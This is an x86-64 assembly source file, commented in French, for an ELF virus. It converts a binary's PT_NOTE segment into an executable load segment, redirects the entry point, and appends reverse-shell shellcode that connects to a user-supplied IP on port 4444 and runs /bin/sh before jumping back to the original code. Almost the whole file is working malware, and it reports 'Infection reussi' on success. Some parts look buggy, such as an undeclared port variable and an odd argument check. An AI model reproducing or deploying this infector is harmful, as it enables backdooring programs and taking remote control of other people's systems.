section .data
    msg_error db "Erreur lors du programme !!!!!!!!!!!", 0xa
    msg_error_len equ $ - msg_error


    msg_ip db "[x] - Veuillez définir l'ip sur laquel le reverse shell pointera : ", 0xa, "[x] -> "
    msg_ip_len equ $ - msg_ip

    msg_lancement db "[x] - Lancement du programme ....", 0xa
    msg_lancement_len equ $ - msg_lancement

    msg_fin db "[x] - Fin du programme .... ",0xa, "[x] - Infection reussi ", 0xa
    msg_fin_len equ $ - msg_fin


    tp_load db 0x01
    droit_write_exe db 0x05

    exagereted dq 0xc000000

    p_align db 0x00, 0x10, 0x00

    reverse_shell_1 db 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0xC7, 0xC0, 0x29, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC7, 0x02, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x50, 0x48, 0xB9, 0x02, 0x00, 0x11, 0x5C,
    reverse_shell_1_len equ $ - reverse_shell_1

    ;ip dynamique mais pas le port ( flemme de devoir gérer la taille du port) -- port acutel static :  4444

    reverse_shell_2 db 0x51, 0x48, 0x89, 0xE6, 0x48, 0xC7, 0xC7, 0x03, 0x00, 0x00, 0x00, 0x6A, 0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x48, 0x85, 0xC0, 0x75, 0x54, 0x58, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xC7, 0xC0, 0x21, 0x00, 0x00, 0x00, 0x5F, 0x57, 0x48, 0xC7, 0xC6, 0x02, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x89, 0xE7, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x0F, 0x05, 0x58, 0x58, 0x48, 0x31, 0xC0, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58
    reverse_shell_2_len equ $ - reverse_shell_2
    

    taille_exagereted dq 0x1000

    ;jump_insctruction db 0x48, 0xb8, 0x40, 0x10, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0
    jump_insctruction db 0x48, 0xb8
    ;ajout de l'old entry point
    jump db 0x00,0x00,0x00,0x00, 0xff, 0xe0
    jump_len  equ $ - jump

     


section .bss
    buffer resb 2000      ; Buffer pour stocker les données lues
    file_name resq 40
    size_file_name resq 1

    file_descriptor resq 1

    offset_tp resq 1

    file_stat resq 10

    file_size resq 1

    new_vaddr resq 1
    new_paddr resq 1

    old_entry_point resb 4
    jmp_entry_point resb 4

    ip_arg resq 4

    ip_result resb 4


section .text
global _start

_start:


    pop rax
    cmp rax, 3 ;; nb d'elem
    jge error

    ; on retire le nom du fichier executable
    pop rsi

    ; recuperation de l'argument 1
    pop rax
    mov [file_name], rax

    xor rax,rax


;========= demander l'ip =========

; Afficher le message "Enter IP: "
    mov rax, 1                   
    mov rdi, 1                   
    mov rsi, msg_ip                 
    mov rdx, msg_ip_len                  
    syscall

 
    mov rax, 0                   
    mov rdi, 0                   ; File descriptor 0 (stdin)
    mov rsi, ip_arg              
    mov rdx, 16 
    syscall

;========== parsing ip ==========


    mov rsi, 0                  ; Index
    mov rdi, ip_result         
    mov rcx, 4                  ; Nombre d'octets
    mov rdx, 0                  

parse_loop:
    cmp byte [ip_arg + rsi], 0xa ; Vérifier la fin de la chaîne
    je store_last_octet

    cmp byte [ip_arg + rsi], '.' ; Vérifier si c'est un point
    je store_octet

    ; Convertir le caractère ASCII en valeur numérique
    movzx rax, byte [ip_arg + rsi]
    sub rax, '0'
    imul rdx, rdx, 10
    add rdx, rax

    inc rsi
    jmp parse_loop

store_octet:
    mov [rdi + rcx], dl         ; Stocker l'octet courant
    inc rcx                     ; Avance
    xor rdx, rdx                ; reset
    inc rsi                     ; Avance
    jmp parse_loop
store_last_octet:
    mov [rdi + rcx], dl                ; Stocker le dernier octet

fin_parsing:



    xor rax,rax
    ; recuperation de l'argument 2
    pop rax
    mov [port_rev], rax

    ; Ouverture du fichier en lecture ecriture 
    mov rax, 2
    mov rdi, [file_name]
    mov rsi, 2
    syscall

    ; verification des erreurs
    test rax, rax 
    js error


    ; Sauvegarde du descripteur de fichier
    mov [file_descriptor], rax



    ; Lecture du fichier
    mov rax, 0          
    mov rdi, [file_descriptor]
    mov rsi, buffer     
    mov rdx, 2000        
    syscall            


; programme bien lancé
    mov rdi, 1              ; file descriptor 1 is stdout
    mov rax, 1              
    mov rsi, msg_lancement       ; affichage du fic debug  
    mov rdx, msg_lancement_len
    syscall 

    ;init
    xor r15, r15
    xor r9, r9
    mov r9, buffer
    xor rcx, rcx



;========= taille du fichier =========

    ;taille du fichier
    mov rax,8
    mov rdi, [file_descriptor]
    mov rsi, 0
    mov rdx, 1
    syscall

    mov rbx, rax

    mov rax,8
    mov rdi,[file_descriptor]
    mov rsi, 0
    mov rdx, 2
    syscall

    mov [file_size], rax ;save

    ;reset du curseur
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi,0
    mov rdx,0
    syscall



;========= Trouver segment NOTE  ========= 

mov r15, buffer

;a rendre dynamique plus tard

    xor rcx, rcx                      
    xor rdx, rdx                   
    mov cx, 12     ;  phnum
    mov rbx, 64    ; file header
    mov dx,  56 ; tailles des segments

    loop_seg:
        add rbx, rdx                  
        dec rcx                        
        xor r13, r13      
        mov r13d , dword [r15 +rbx] ; PT_NOTE trouvé
        cmp dword [r15 +rbx], 0x4  ; PT_NOTE valeur
        je pt_note_ok
        cmp rcx, 0
        jg loop_seg


        jmp error 

    pt_note_ok:

    mov [offset_tp], rbx ; Offset du PT_NOTE !!!! 
    
    xor rcx,rcx
    xor rax, rax

    mov rax, [exagereted]
    add rax, [file_size]
    mov [new_vaddr], rax

 

    modification_file:


    xor rax,rax

    mov rdi, [file_descriptor] ; meme premier arg pour toutes les autres fonctions

;=============== Get old entry point =================

    mov rax, 8          ; lseek curseur
    mov rsi, 0x18     ; offset jusqu'au entry point
    mov rdx, 0          
    syscall     

    mov rax, 0          ; read 
    mov rsi, old_entry_point  ; adresse où stocker l'ancien entry point
    mov rdx, 8          ; taille de l'entrée à lire (8 octets pour un pointeur)
    syscall

;=============== change entry point =================
    mov rax, 8          ; lseek curseur
    mov rsi, 0x18     ; offset jusqu'au entry point
    mov rdx, 0          
    syscall       

    mov rax, 1         
    mov rsi, new_vaddr   ; offset + valeur exagéré( c000000)
    mov rdx, 8 
    syscall 

; =============== PT NOte to PT LOAD =================
    mov rax, 8          
    mov rsi, [offset_tp]     
    mov rdx, 0          ; type 
    syscall       

    mov rax, 1         
    mov rsi, tp_load 
    mov rdx, 1 
    syscall    

    
; =============== Changement droit  =================

    mov rax, 8          
    mov rsi, [offset_tp]  
    add rsi , 4    ; Droit 
    mov rdx, 0         
    syscall       

    mov rax, 1         
    mov rsi, droit_write_exe   
    mov rdx, 1 
    syscall             


; =============== Address offset  =================

    mov rax, 8          
    mov rsi, [offset_tp]  
    add rsi , 8   ; offset
    mov rdx, 0          
    syscall       

    mov rax, 1         
    mov rsi, file_size  
    mov rdx, 3 
    syscall         



; =============== Virtual address  =================

    mov rax, 8          
    mov rsi, [offset_tp]  
    add rsi , 16   ; vaddr
    mov rdx, 0        
    syscall       

    mov rax, 1         
    mov rsi, new_vaddr
    mov rdx, 4 
    syscall       


; =============== Taille to exe  filesiz =================
   
    mov rax, 8         
    mov rsi, [offset_tp]  
    add rsi , 32   ; taille a lire file
    mov rdx, 0
    syscall       

    mov rax, 1         
    mov rsi, taille_exagereted  
    mov rdx, 3 
    syscall          



; =============== Taille to exe memsiz =================
   
    mov rax, 8         
    mov rsi, [offset_tp]  
    add rsi , 40  ; taille a lire mem
    mov rdx, 0          
    syscall       

    mov rax, 1         
    mov rsi, taille_exagereted   
    mov rdx, 3 
    syscall         


; =============== p align =================
  
    mov rax, 8        
    mov rsi, [offset_tp]  
    add rsi , 48  ; alignement
    mov rdx, 0         
    syscall       

    mov rax, 1         
    mov rsi, p_align   
    mov rdx, 3 ;
    syscall         

; =============== Ajout shell code  part 1 =================

    mov rax, 8          
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rsi, reverse_shell_1  
    mov rdx, reverse_shell_1_len
    syscall      


    ; =============== Ajout IP shell code =================

    mov rax, 8          
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rsi, ip_result 
    mov rdx, 4
    syscall      



; =============== Ajout shell code  part 2 =================

    mov rax, 8          
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rsi, reverse_shell_2  
    mov rdx, reverse_shell_2_len
    syscall      


;=============================================================
; =============== Ajout instruction de saut  =================

    mov rax, 8          
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rsi, jump_insctruction  
    mov rdx, 2
    syscall    


; =============== Ajout offset a sauter  =================

    mov rax, 8          
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1    
    mov rsi, old_entry_point
    mov rdx, 4     
    syscall
      

; =============== jump  =================

    mov rax, 8          
    mov rsi, 0 
    mov rdx, 2        ; fin du fichier 
    syscall  

    mov rax, 1         
    mov rsi, jump
    mov rdx, jump_len
    syscall
      

sortie:

    ;fermeture fichier
    mov rax, 3          
    syscall  

    ;message de fin
    mov rdi, 1             
    mov rax, 1              
    mov rsi, msg_fin      
    mov rdx, msg_fin_len
    syscall 

    ; Code de sortie
    mov rax, 60    
    mov rdi, 0    
    syscall     

error:
    mov rax, 1
    mov rdi, 1
    mov rsi, msg_error
    mov rdx, msg_error_len
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

